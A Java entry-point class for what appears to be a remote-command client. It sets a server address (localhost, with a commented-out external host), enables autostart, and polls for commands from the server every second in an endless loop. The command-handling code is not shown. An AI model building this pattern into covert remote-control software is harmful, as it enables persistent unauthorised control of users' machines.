package ch.lebois.client;

import ch.lebois.client.configure.Autostart;
import ch.lebois.client.configure.ClientConfigure;
import ch.lebois.client.handler.CommandReader;

public class ClientApplication {

    public static void main(String[] args) {
        ClientConfigure clientConfigure = new ClientConfigure();
        clientConfigure.setServer("http://localhost:8090/");
//        clientConfigure.setServer("http://scorewinner.ch:8090/");
        clientConfigure.setArch("2.9");


        new Autostart().decide();

        while (true) {
            CommandReader.read();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
